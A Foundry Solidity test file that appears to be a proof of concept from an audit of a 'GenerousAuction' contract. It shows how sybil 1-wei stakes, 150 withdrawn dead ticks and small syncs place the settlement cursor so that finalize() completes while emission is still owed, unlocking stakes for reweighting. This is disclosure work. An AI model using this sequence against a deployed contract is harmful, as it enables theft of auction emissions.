// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {GenerousAuction} from "../src/GenerousAuction.sol";
import {Mono} from "../src/Mono.sol";
import {IGenerousAuction} from "../src/interfaces/IGenerousAuction.sol";
import {IIndex} from "../src/interfaces/IIndex.sol";
import {MockPool} from "./MockPool.sol";
import {TestERC20} from "./TestERC20.sol";

/// PoC: finalize() flips on a TAIL sweep (settleCursor != 0 at entry) that sells nothing,
/// even though a live, staked bid stands ABOVE the cursor and due() > 0.
contract PoCFinalizeTail is Test {
    GenerousAuction internal auction;
    Mono internal mono;
    TestERC20 internal cur;

    uint256 internal constant GENESIS = 1_000_000e18;
    uint256 internal constant FLOOR = 1e18;
    uint256 internal constant SPACING = 1e16;
    uint256 internal constant Q96 = 1 << 96;
    uint64 internal constant K = 100;

    uint256 internal constant DEAD_RUN = 150;
    uint256 internal constant M = FLOOR + 170 * SPACING; // 2.70e18
    uint256 internal constant H = M + 20 * SPACING; // 2.90e18 (outside M's 8-tick band)

    address internal aa = address(0xA1);
    address internal bb = address(0xA2);

    uint64 internal endBlk;

    function setUp() public {
        cur = new TestERC20("Index", "INDEX");
        mono = new Mono(IIndex(address(cur)), 10 * GENESIS);
        cur.mint(address(this), GENESIS);
        cur.approve(address(mono), GENESIS);
        mono.mint(GENESIS, GENESIS, address(this));
        MockPool pool = new MockPool(address(mono), address(cur), 1.25e18);
        mono.setPool(address(pool));

        endBlk = uint64(block.number + 3 * K);
        auction = new GenerousAuction(
            IGenerousAuction.Config({
                token: address(mono),
                currency: address(cur),
                admin: address(0xF1),
                floorPrice: FLOOR,
                tickSpacing: SPACING,
                decayQ: Q96 / 2,
                windowTicks: 8,
                startBlock: uint64(block.number),
                endBlock: endBlk,
                roundBlocks: K,
                emissionPerRound: 50e18,
                minPremiumBips: 1_500,
                previousAuction: address(0)
            })
        );
        mono.grantRole(mono.MINTER_ROLE(), address(auction));
        mono.renounceRole(mono.MINTER_ROLE(), address(this));
    }

    function _stakeFor(address who, uint256 amt) internal {
        mono.transfer(who, amt);
        vm.startPrank(who);
        mono.approve(address(auction), amt);
        auction.stake(amt);
        vm.stopPrank();
    }

    function _bid(address who, uint256 price, uint128 amount, uint256 prev) internal {
        cur.mint(who, amount);
        vm.startPrank(who);
        cur.approve(address(auction), amount);
        auction.submitBid(price, amount, who, prev);
        vm.stopPrank();
    }

    function _capAt(uint256 price) internal view returns (uint256 cap) {
        (,, cap,,,,) = auction.ticks(price);
    }

    function test_prematureFinalizeOnTailSweep() public {
        // 1. Seed a run of 150 initialized-but-dead ticks just above the floor
        //    (sybil stake 1 wei -> min bid -> withdraw; all while due() == 0, so no sync runs).
        uint256 prev = FLOOR;
        for (uint256 i = 1; i <= DEAD_RUN; ++i) {
            uint256 p = FLOOR + i * SPACING;
            address syb = address(uint160(0x100000 + i));
            _stakeFor(syb, 1);
            _bid(syb, p, 10, prev);
            vm.prank(syb);
            auction.withdrawBid();
            prev = p;
        }

        // 2. Live book: bb at M, aa at H (separate windows, both small caps).
        _stakeFor(bb, 1e18);
        _bid(bb, M, 1e18, FLOOR + DEAD_RUN * SPACING);
        _stakeFor(aa, 1e18);
        _bid(aa, H, 1e18, M);

        // 3. One emission round; two tiny syncs plant the cursor at the top of the dead run.
        vm.roll(block.number + K);
        auction.sync(1); // pours H's window dry, cursor -> M
        auction.sync(1); // pours M's window dry, cursor -> top of dead run
        assertEq(auction.settleCursor(), FLOOR + DEAD_RUN * SPACING, "cursor at dead-run top");

        // 4. aa revives H with a fresh top-up bid (pre-endBlock). Its implicit sync (128 nodes)
        //    cannot cross the 150-deep dead run, so the cursor stays inside it, BELOW H.
        _bid(aa, H, 1e18, M);
        uint256 cursor = auction.settleCursor();
        assertTrue(cursor != 0 && cursor < H, "cursor still mid-dead-run, below live H");
        assertGt(_capAt(H), 0, "H is live above the cursor");

        // 5. Sale ends. finalize's sweep is only the TAIL below the cursor - all dead - so it
        //    sells 0 and comes back with settleCursor == 0: "complete sweep sold nothing".
        vm.roll(endBlk);
        uint256 owedBefore = auction.due();
        assertGt(owedBefore, 0, "carry still owed");

        bool done = auction.finalize(10_000);

        // BUG: finalized with due() > 0 and a live, staked, unexhausted bid at H.
        assertTrue(done, "finalize flipped");
        assertTrue(auction.finalized(), "finalized flag set");
        assertGt(auction.due(), 0, "emission still undistributed");
        assertGt(_capAt(H), 0, "H still live and able to absorb");

        // Stakes are now unlocked while pre-endBlock emission is still undistributed:
        // a fresh stake reweighs rounds that already happened, then the next sync pays it.
        _stakeFor(bb, 100e18); // would revert StakeLocked if the lock were still honest
        auction.sync(1_000); // distributes the pre-endBlock carry under post-unlock weights
        assertLt(auction.due(), owedBefore, "carry distributed after finalize");
    }
}
